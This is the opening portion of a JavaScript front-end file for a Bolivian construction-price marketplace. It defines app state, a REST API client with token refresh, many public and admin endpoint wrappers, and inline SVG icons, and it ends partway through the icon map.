/**
 * APU Marketplace — Portal Publico de Precios de Construccion
 * Public-first SPA. No login required to browse prices and suppliers.
 */

// ── State ──────────────────────────────────────────────────────
const state = {
    user: null,
    token: null,
    refreshToken: null,
    currentPage: 'home',
    currentParams: null,
    searchQuery: '',
    selectedCategory: null,
    selectedSubcategory: null,
    categoryTree: [],
    selectedDepartment: null,
    cart: [],
    // Proveedores page: modo de busqueda ('supplier' | 'material') + filtro por insumo
    supplierSearchMode: 'supplier',
    insumoFilter: null, // { id, name }
};

// ── API Client ─────────────────────────────────────────────────
const API_BASE = '/api/v1';

const API = {
    async _fetch(path, opts = {}) {
        const headers = { 'Content-Type': 'application/json', ...opts.headers };
        if (state.token) headers['Authorization'] = `Bearer ${state.token}`;
        const resp = await fetch(`${API_BASE}${path}`, { ...opts, headers });
        if (resp.status === 401 && state.refreshToken) {
            const refreshed = await this._refresh();
            if (refreshed) {
                headers['Authorization'] = `Bearer ${state.token}`;
                return fetch(`${API_BASE}${path}`, { ...opts, headers });
            }
            logout();
        }
        return resp;
    },

    async _refresh() {
        try {
            const resp = await fetch(`${API_BASE}/auth/refresh`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ refresh_token: state.refreshToken }),
            });
            if (!resp.ok) return false;
            const data = await resp.json();
            state.token = data.access_token;
            state.refreshToken = data.refresh_token;
            localStorage.setItem('_mkt_token', state.token);
            localStorage.setItem('_mkt_refresh', state.refreshToken);
            return true;
        } catch { return false; }
    },

    async get(path) { return (await this._fetch(path)).json(); },
    async post(path, body) {
        return (await this._fetch(path, { method: 'POST', body: JSON.stringify(body) })).json();
    },
    async put(path, body) {
        return (await this._fetch(path, { method: 'PUT', body: JSON.stringify(body) })).json();
    },
    async patch(path, body) {
        return (await this._fetch(path, { method: 'PATCH', body: JSON.stringify(body) })).json();
    },
    async del(path) { return (await this._fetch(path, { method: 'DELETE' })).json(); },
    async upload(path, formData) {
        const headers = {};
        if (state.token) headers['Authorization'] = `Bearer ${state.token}`;
        return (await fetch(`${API_BASE}${path}`, { method: 'POST', headers, body: formData })).json();
    },

    // Auth
    login: (email, password) => API.post('/auth/login', { email, password }),
    register: (data) => API.post('/auth/register', data),

    // Public — no auth
    publicPrices: (params = '') => API.get(`/prices/public${params}`),
    searchPrices: (q) => API.get(`/prices/public/search?q=${encodeURIComponent(q)}`),
    smartSearch: (q, category = null, limit = 20) => {
        const cat = category ? `&category=${encodeURIComponent(category)}` : '';
        return API.get(`/prices/public/smart-search?q=${encodeURIComponent(q)}${cat}&limit=${limit}`);
    },
    publicSuppliers: (params = '') => API.get(`/suppliers/public${params}`),
    publicSuppliersMap: (params = '') => API.get(`/suppliers/public/map${params}`),
    supplierCategories: () => API.get('/suppliers/public/categories'),
    supplierCities: () => API.get('/suppliers/public/cities'),
    publicSupplierDetail: (id) => API.get(`/suppliers/public/${id}`),
    publicInsumoDetail: (id) => API.get(`/prices/public/${id}`),
    publicInsumoSuppliers: (id) => API.get(`/prices/public/${id}/suppliers`),
    priceCategories: () => API.get('/prices/categories/list'),

    // Authenticated
    suppliers: (params = '') => API.get(`/suppliers${params}`),
    supplier: (id) => API.get(`/suppliers/${id}`),
    createSupplier: (data) => API.post('/suppliers', data),
    updateSupplier: (id, data) => API.put(`/suppliers/${id}`, data),
    branchContacts: (sid, bid) => API.get(`/suppliers/${sid}/branches/${bid}/contacts`),
    createContact: (sid, bid, data) => API.post(`/suppliers/${sid}/branches/${bid}/contacts`, data),
    updateContact: (sid, bid, cid, data) => API.put(`/suppliers/${sid}/branches/${bid}/contacts/${cid}`, data),
    deleteContact: (sid, bid, cid) => API.del(`/suppliers/${sid}/branches/${bid}/contacts/${cid}`),
    quotations: (params = '') => API.get(`/quotations${params}`),
    quotation: (id) => API.get(`/quotations/${id}`),
    createQuotation: (data) => API.post('/quotations', data),
    processQuotation: (id) => API.post(`/quotations/${id}/process`),
    uploadQuotation: (formData) => API.upload('/quotations/upload', formData),
    insumos: (params = '') => API.get(`/prices${params}`),
    insumo: (id) => API.get(`/prices/${id}`),
    createInsumo: (data) => API.post('/prices', data),
    uploadInsumoImage: (id, formData) => API.upload(`/prices/${id}/image`, formData),
    deleteInsumoImage: (id) => API.del(`/prices/${id}/image`),
    geocodeAddress: (q) => API.get(`/suppliers/geocode?q=${encodeURIComponent(q)}`),
    geocodeStatus: () => API.get('/admin/suppliers/geocode-status'),
    bulkGeocode: (batchSize = 20) => API.post(`/admin/suppliers/bulk-geocode?batch_size=${batchSize}`, {}),
    geocodeSingleSupplier: (id, address = null) => API.post(`/admin/suppliers/${id}/geocode`, { address, save: true }),
    rfqs: (params = '') => API.get(`/rfq${params}`),
    createRFQ: (data) => API.post('/rfq', data),
    stats: () => API.get('/admin/stats'),
    mergePreview: (keepId, absorbId) => API.get(`/admin/suppliers/merge-preview?keep_id=${keepId}&absorb_id=${absorbId}`),
    mergeSuppliers: (data) => API.post('/admin/suppliers/merge', data),
    mergeSearchSuppliers: (q) => API.get(`/admin/suppliers/search?q=${encodeURIComponent(q)}`),
    duplicateSuggestions: () => API.get('/admin/suppliers/duplicate-suggestions'),

    // Admin — user management
    adminUsers: (params = '') => API.get(`/admin/users${params}`),
    adminCreateUser: (data) => API.post('/admin/users', data),
    adminUpdateUser: (id, data) => API.put(`/admin/users/${id}`, data),
    adminResetPassword: (id) => API.post(`/admin/users/${id}/reset-password`),

    // Admin — API keys
    apiKeys: () => API.get('/admin/api-keys'),
    createApiKey: (data) => API.post('/admin/api-keys', data),
    updateApiKey: (id, data) => API.put(`/admin/api-keys/${id}`, data),
    revokeApiKey: (id) => API.del(`/admin/api-keys/${id}`),

    // Admin — catalog (categories & UOMs)
    adminCategories: () => API.get('/admin/categories'),
    adminCreateCategory: (data) => API.post('/admin/categories', data),
    adminUpdateCategory: (id, data) => API.put(`/admin/categories/${id}`, data),
    adminDeleteCategory: (id) => API.del(`/admin/categories/${id}`),
    adminUoms: () => API.get('/admin/uoms'),
    adminCreateUom: (data) => API.post('/admin/uoms', data),
    adminUpdateUom: (id, data) => API.put(`/admin/uoms/${id}`, data),
    adminDeleteUom: (id) => API.del(`/admin/uoms/${id}`),

    // Admin — groups
    adminGroups: (params = '') => API.get(`/groups${params}`),
    adminGroup: (id) => API.get(`/groups/${id}`),
    createGroup: (data) => API.post('/groups', data),
    updateGroup: (id, data) => API.put(`/groups/${id}`, data),
    deleteGroup: (id) => API.del(`/groups/${id}`),
    addGroupMembers: (id, ids) => API.post(`/groups/${id}/members`, { insumo_ids: ids }),
    removeGroupMember: (gid, iid) => API.del(`/groups/${gid}/members/${iid}`),
    groupSuggestions: (params = '') => API.get(`/groups/suggestions${params}`),
    acceptGroupSuggestion: (data) => API.post('/groups/suggestions/accept', data),

    // Pedidos (cotizacion requests)
    pedidos: (params = '') => API.get(`/pedidos${params}`),
    pedido: (id) => API.get(`/pedidos/${id}`),
    createPedido: (data) => API.post('/pedidos', data),
    updatePedido: (id, data) => API.put(`/pedidos/${id}`, data),
    deletePedido: (id) => API.del(`/pedidos/${id}`),
    addPedidoItems: (id, items) => API.post(`/pedidos/${id}/items`, items),
    removePedidoItem: (pid, iid) => API.del(`/pedidos/${pid}/items/${iid}`),
    addPrecio: (pid, iid, data) => API.post(`/pedidos/${pid}/items/${iid}/precio`, data),
    selectPrecio: (pid, iid, prid) => API.post(`/pedidos/${pid}/items/${iid}/precio/${prid}/select`),
    completePedido: (id) => API.post(`/pedidos/${id}/complete`),
    deliverPedido: (id) => API.post(`/pedidos/${id}/deliver`),
    uploadPedidoDoc: (id, formData) => API.upload(`/pedidos/${id}/upload`, formData),

    // Inbox (Fase 2)
    inboxSessions: (params = '') => API.get(`/inbox/sessions${params}`),
    inboxSession: (id) => API.get(`/inbox/sessions/${id}`),
    inboxSend: (id, text) => API.post(`/inbox/sessions/${id}/send`, { text }),
    inboxClaim: (id) => API.post(`/inbox/sessions/${id}/claim`),
    inboxRelease: (id) => API.post(`/inbox/sessions/${id}/release`),
    inboxAssign: (id, operatorId) => API.post(`/inbox/sessions/${id}/assign`, { operator_id: operatorId }),
    inboxOperators: () => API.get(`/inbox/operators`),
    inboxMetrics: (days = 7, slaHours = 1) => API.get(`/inbox/metrics?days=${days}&sla_hours=${slaHours}`),
    inboxNote: (id, text) => API.post(`/inbox/sessions/${id}/note`, { text }),
    inboxMarkRead: (id) => API.post(`/inbox/sessions/${id}/mark-read`),
    inboxTemplates: () => API.get(`/inbox/templates`),
    inboxTemplateCreate: (data) => API.post(`/inbox/templates`, data),
    inboxTemplateUpdate: (id, data) => API.put(`/inbox/templates/${id}`, data),
    inboxTemplateDelete: (id) => API.del(`/inbox/templates/${id}`),
    inboxAutoAssignGet: () => API.get(`/admin/inbox-autoassign`),
    inboxAutoAssignSave: (data) => API.put(`/admin/inbox-autoassign`, data),
    operatorScheduleGet: (userId) => API.get(`/admin/operator-schedule/${userId}`),
    operatorScheduleSave: (userId, windows) => API.put(`/admin/operator-schedule/${userId}`, { windows }),
    inboxSlaHandoffGet: () => API.get(`/admin/inbox-sla-handoff`),
    inboxSlaHandoffSave: (data) => API.put(`/admin/inbox-sla-handoff`, data),
    // 5.12 — Tags
    inboxTags: () => API.get(`/inbox/tags`),
    inboxTagCreate: (data) => API.post(`/inbox/tags`, data),
    inboxTagUpdate: (id, data) => API.patch(`/inbox/tags/${id}`, data),
    inboxTagDelete: (id) => API.del(`/inbox/tags/${id}`),
    inboxSessionTagAdd: (sid, body) => API.post(`/inbox/sessions/${sid}/tags`, body),
    inboxSessionTagRemove: (sid, tagId) => API.del(`/inbox/sessions/${sid}/tags/${tagId}`),

    // APU — proyectos, presupuestos y analisis de precios unitarios
    apuProjects: (params = '') => API.get(`/apu/projects${params}`),
    apuProject: (id) => API.get(`/apu/projects/${id}`),
    apuCreateProject: (data) => API.post('/apu/projects', data),
    apuRecomputeProject: (id) => API.post(`/apu/projects/${id}/recompute`, {}),
    apuRefreshProjectPrices: (id, includeManual = false) =>
        API.post(`/apu/projects/${id}/refresh-prices?include_manual=${includeManual ? 'true' : 'false'}`, {}),
    apuItem: (id) => API.get(`/apu/items/${id}`),
    apuAddLine: (itemId, data) => API.post(`/apu/items/${itemId}/lines`, data),
    apuUpdateLine: (id, data) => API.put(`/apu/lines/${id}`, data),
    apuDeleteLine: (id) => API.del(`/apu/lines/${id}`),
    apuAddComputo: (itemId, data) => API.post(`/apu/items/${itemId}/computos`, data),
    apuUpdateComputo: (id, data) => API.put(`/apu/computos/${id}`, data),
    apuDeleteComputo: (id) => API.del(`/apu/computos/${id}`),

    // APU — plantillas de calculo (recargos, formulas y precio final)
    apuTemplates: (projectId = null) =>
        API.get(`/apu/templates${projectId ? `?project_id=${encodeURIComponent(projectId)}` : ''}`),
    apuTemplate: (id) => API.get(`/apu/templates/${id}`),
    apuCreateTemplate: (data) => API.post('/apu/templates', data),
    apuCloneTemplate: (id, data) => API.post(`/apu/templates/${id}/clone`, data || {}),
    apuUpdateTemplate: (id, data) => API.put(`/apu/templates/${id}`, data),
    apuDeleteTemplate: (id) => API.del(`/apu/templates/${id}`),

    // Biblioteca de insumos de la empresa
    companyInsumos: (params = '') => API.get(`/company-insumos${params}`),
    createCompanyInsumo: (data) => API.post('/company-insumos', data),
    updateCompanyInsumo: (id, data) => API.put(`/company-insumos/${id}`, data),
    deleteCompanyInsumo: (id) => API.del(`/company-insumos/${id}`),
    importCompanyInsumo: (catalogInsumoId) => API.post(`/company-insumos/${catalogInsumoId}/import-from-catalog`, {}),

    // Cola de curacion de precios (staff)
    curationQueue: (params = '') => API.get(`/company-insumos/suggestions/queue${params}`),
    curationAccept: (id, note) => API.post(`/company-insumos/suggestions/${id}/accept`, { note: note || null }),
    curationReject: (id, note) => API.post(`/company-insumos/suggestions/${id}/reject`, { note: note || null }),
    curationConfig: () => API.get('/company-insumos/suggestions/config'),
    curationSetConfig: (data) => API.put('/company-insumos/suggestions/config', data),

    // Public — grouped prices
    publicGroupedPrices: (params = '') => API.get(`/prices/public/grouped${params}`),

    // Companies
    myCompany: () => API.get('/companies/mine'),
    createCompany: (data) => API.post('/companies', data),
    updateCompany: (id, data) => API.put(`/companies/${id}`, data),
    companyMembers: (id) => API.get(`/companies/${id}/members`),
    addMember: (id, data) => API.post(`/companies/${id}/members`, data),
    updateMember: (cid, uid, data) => API.put(`/companies/${cid}/members/${uid}`, data),
    removeMember: (cid, uid) => API.del(`/companies/${cid}/members/${uid}`),
    companyPedidos: (id, params = '') => API.get(`/companies/${id}/pedidos${params}`),
    assignPedido: (cid, pid, uid) => API.post(`/companies/${cid}/pedidos/${pid}/assign?assignee_id=${uid}`),

    // Subscriptions
    plans: () => API.get('/subscriptions/plans'),
    mySubscription: () => API.get('/subscriptions/mine'),
    requestUpgrade: (data) => API.post('/subscriptions/upgrade', data),

    // Admin — companies & subscriptions
    adminCompanies: (params = '') => API.get(`/admin/companies${params}`),
    adminSubscriptions: (params = '') => API.get(`/admin/subscriptions${params}`),
    adminUpdateSubscription: (id, data) => API.put(`/admin/subscriptions/${id}`, data),

    // Supplier suggestions
    suggestSupplier: (data) => API.post('/suppliers/suggest', data),
    mySuggestions: (params = '') => API.get(`/suppliers/suggestions${params}`),
    adminSuggestions: (params = '') => API.get(`/admin/supplier-suggestions${params}`),
    approveSuggestion: (id) => API.put(`/admin/supplier-suggestions/${id}/approve`),
    rejectSuggestion: (id, reason = '') => API.put(`/admin/supplier-suggestions/${id}/reject?reason=${encodeURIComponent(reason)}`),

    // Admin — plans
    adminPlans: () => API.get('/admin/plans'),
    adminCreatePlan: (data) => API.post('/admin/plans', data),
    adminUpdatePlan: (id, data) => API.put(`/admin/plans/${id}`, data),
    adminDeletePlan: (id) => API.del(`/admin/plans/${id}`),

    // Admin — tasks
    adminJobs: () => API.get('/admin/tasks/jobs'),
    adminTaskLogs: (jobName = '', skip = 0, limit = 20) => API.get(`/admin/tasks/logs?job_name=${jobName}&skip=${skip}&limit=${limit}`),
    adminRunJob: (name) => API.post(`/admin/tasks/${name}/run`),

    // Admin — AI config
    adminAIConfig: () => API.get('/admin/ai-config'),
    adminUpdateAIConfig: (data) => API.put('/admin/ai-config', data),
    adminTestAI: () => API.post('/admin/ai-config/test'),

    // Admin — AI Agents
    adminAgents: () => API.get('/admin/agents'),
    adminCreateAgent: (data) => API.post('/admin/agents', data),
    adminUpdateAgent: (id, data) => API.put(`/admin/agents/${id}`, data),
    adminDeleteAgent: (id) => API.del(`/admin/agents/${id}`),
    adminToggleAgent: (id) => API.post(`/admin/agents/${id}/toggle`),
    adminTestAgent: (id) => API.post(`/admin/agents/${id}/test`),

    // Company — AI config
    companyAIConfig: (companyId) => API.get(`/companies/${companyId}/ai-config`),
    updateCompanyAIConfig: (companyId, data) => API.put(`/companies/${companyId}/ai-config`, data),
    deleteCompanyAIConfig: (companyId) => API.del(`/companies/${companyId}/ai-config`),

    // Notifications
    notifications: (skip = 0, limit = 20) => API.get(`/notifications?skip=${skip}&limit=${limit}`),
    unreadCount: () => API.get('/notifications/unread-count'),
    markRead: (id) => API.put(`/notifications/${id}/read`),
    markAllRead: () => API.post('/notifications/mark-all-read'),

    // Admin — SEO config
    adminSeoConfig: () => API.get('/admin/seo-config'),
    adminUpdateSeoConfig: (data) => API.put('/admin/seo-config', data),

    // Admin — Integrations
    adminEmbeddingsConfig: () => API.get('/admin/embeddings/config'),
    adminEmbeddingsSetConfig: (data) => API.put('/admin/embeddings/config', data),
    adminEmbeddingsStatus: () => API.get('/admin/embeddings/status'),
    adminEmbeddingsBackfill: (batchSize = 100, maxBatches = 10) =>
        API.post(`/admin/embeddings/backfill?batch_size=${batchSize}&max_batches=${maxBatches}`, {}),
    adminIntegrations: () => API.get('/admin/integrations'),
    adminUpdateIntegrations: (data) => API.put('/admin/integrations', data),
    adminTestWhatsApp: (data) => API.post('/admin/integrations/test-whatsapp', data || {}),
    adminTestEmail: () => API.post('/admin/integrations/test-email'),
    adminEvolutionHealth: () => API.get('/admin/integrations/evolution-health'),
    adminWebhookLogs: (params = {}) => {
        const q = new URLSearchParams();
        if (params.source) q.set('source', params.source);
        if (params.event_type) q.set('event_type', params.event_type);
        if (params.instance_name) q.set('instance_name', params.instance_name);
        if (params.status) q.set('status', params.status);
        if (params.limit) q.set('limit', String(params.limit));
        if (params.offset) q.set('offset', String(params.offset));
        const qs = q.toString();
        return API.get('/admin/webhook-logs' + (qs ? '?' + qs : ''));
    },
    adminWebhookLogDetail: (id) => API.get('/admin/webhook-logs/' + encodeURIComponent(id)),

    // Public site config (no auth needed)
    siteConfig: () => fetch(`${API_BASE}/site-config`).then(r => r.json()),

    // Public catalog
    catalogCategories: () => API.get('/admin/catalog/categories'),
    catalogUoms: () => API.get('/admin/catalog/uoms'),
};

// ── Categories & UOMs (loaded from API) ───────────────────────
let CATEGORY_META = {};
let UOM_LIST = [];

async function loadCatalogData() {
    try {
        const [catResp, uomResp] = await Promise.all([
            API.catalogCategories(),
            API.catalogUoms(),
        ]);
        if (catResp.ok) {
            CATEGORY_META = {};
            catResp.data.forEach(c => {
                CATEGORY_META[c.key] = { label: c.label, icon: c.icon || '' };
            });
        }
        if (uomResp.ok) {
            UOM_LIST = uomResp.data;
        }
    } catch {}
}

const DEPARTMENTS = [
    'Santa Cruz', 'La Paz', 'Cochabamba', 'Tarija',
    'Sucre', 'Oruro', 'Potosi', 'Beni', 'Pando',
];

// ── Icons (inline SVG) ─────────────────────────────────────────
const ICONS = {
    home: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9,22 9,12 15,12 15,22"/></svg>',
    tag: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83 0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7.01" y2="7"/></svg>',
    users: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4-4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87"/><path d="M16 3.13a4 4 0 010 7.75"/></svg>',
    search: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>',
    'file-text': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14,2 14,8 20,8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>',
    send: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22,2 15,22 11,13 2,9"/></svg>',
    plus: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>',
    upload: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17,8 12,3 7,8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>',
    login: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4"/><polyline points="10,17 15,12 10,7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>',
    logout: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4"/><polyline points="16,17 21,12 16,7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>',
    phone: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z"/></svg>',
    whatsapp: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>',
    map: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>',
    'map-pin': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>',
    star: '<svg viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1"><polygon points="12,2 15.09,8.26 22,9.27 17,14.14 18.18,21.02 12,17.77 5.82,21.02 7,14.14 2,9.27 8.91,8.26"/></svg>',
    'bar-chart': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="20" x2="12" y2="10"/><line x1="18" y1="20" x2="18" y2="4"/><line x1="6" y1="20" x2="6" y2="16"/></svg>',
    'trending-up': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23,6 13.5,15.5 8.5,10.5 1,18"/><polyline points="17,6 23,6 23,12"/></svg>',
    settings: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83 0 2 2 0 010-2.83l.06-.06A1.65 1.65 0 004.68 15a1.65 1.65 0 00-1.51-1H3a2 2 0 010-4h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 012.83-2.83l.06.06A1.65 1.65 0 009 4.68a1.65 1.65 0 001-1.51V3a2 2 0 014 0v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 2.83l-.06.06A1.65 1.65 0 0019.4 9a1.65 1.65 0 001.51 1H21a2 2 0 010 4h-.09a1.65 1.65 0 00-1.51 1z"/></svg>',
    edit: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>',
    image: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21,15 16,10 5,21"/></svg>',
    navigation: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"><polygon points="3 11 22 2 13 21 11 13 3 11"/></svg>',
    trash: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3,6 5,6 21,6"/><path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/></svg>',
    'user-plus': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 21v-2a4 4 0 00-4-4H5a4 4 0 00-4-4v2"/><circle cx="8.5" cy="7" r="4"/><line x1="20" y1="8" x2="20" y2="14"/><line x1="23" y1="11" x2="17" y2="11"/></svg>',
    key: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 11-7.778 7.778 5.5 5.5 0 017.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>',
    'check-circle': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22,4 12,14.01 9,11.01"/></svg>',
    check: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20,6 9,17 4,12"/></svg>',
    x: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>',
    globe: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>',
    mail: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>',
    layers: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12,2 2,7 12,12 22,7"/><polyline points="2,17 12,22 22,17"/><polyline points="2,12 12,17 22,12"/></svg>',
    package: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16.5 9.4l-9-5.19M21 16V8a2 2 0 00-1-1.73l-7-4a2 2 0 00-2 0l-7 4A2 2 0 003 8v8a2 2 0 001 1.73l7 4a2 2 0 002 0l7-4A2 2 0 0021 16z"/><polyline points="3.27,6.96 12,12.01 20.73,6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></svg>',
    filter: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"/></svg>',
    'chevron-down': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6,9 12,15 18,9"/></svg>',
    'chevron-up': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18,15 12,9 6,15"/></svg>',
    'shopping-cart': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 002 1.61h9.72a2 2 0 002-1.61L23 6H6"/></svg>',
    clipboard: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 4h2a2 2 0 012 2v14a2 2 0 01-2 2H6a2 2 0 01-2-2V6a2 2 0 012-2h2"/><rect x="8" y="2" width="8" height="4" rx="1" ry="1"/></svg>',
    building: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="2" width="16" height="20" rx="2" ry="2"/><path d="M9 22v-4h6v4"/><line x1="8" y1="6" x2="8" y2="6.01"/><line x1="16" y1="6" x2="16" y2="6.01"/><line x1="12" y1="6" x2="12" y2="6.01"/><line x1="8" y1="10" x2="8" y2="10.01"/><line x1="16" y1="10" x2="16" y2="10.01"/><line x1="12" y1="10" x2="12" y2="10.01"/><line x1="8" y1="14" x2="8" y2="14.01"/><line x1="16" y1="14" x2="16" y2="14.01"/><line x1="12" y1="14" x2="12" y2="14.01"/></svg>',
    star: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12,2 15.09,8.26 22,9.27 17,14.14 18.18,21.02 12,17.77 5.82,21.02 7,14.14 2,9.27 8.91,8.26"/></svg>',
